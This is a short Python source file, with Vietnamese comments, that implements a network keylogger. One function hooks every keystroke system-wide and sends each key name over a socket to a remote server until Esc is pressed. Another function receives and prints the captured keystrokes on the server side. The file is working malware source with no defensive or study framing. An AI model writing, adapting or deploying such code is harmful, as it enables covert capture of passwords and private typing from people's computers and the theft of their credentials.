import keyboard

def receive_key_loggers(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(data, end='', flush=True)  # In ra phím nhấn
        except ConnectionResetError:
            print("Server disconnected.")
            break

def start_keylogger(client_socket):
    def on_key_press(event):
        try:
            # Gửi phím nhấn tới server
            keystroke = event.name
            client_socket.send(keystroke.encode('utf-8'))
        except Exception as e:
            print(f"Lỗi khi gửi phím nhấn: {e}")

    # Bắt đầu lắng nghe phím nhấn và gửi tới server
    print("Bắt đầu ghi nhận phím nhấn. Nhấn 'Esc' để dừng.")
    keyboard.hook(on_key_press)

    # Chờ phím 'Esc' để dừng bắt phím
    keyboard.wait('esc')
    print("Đã dừng ghi nhận phím nhấn.")
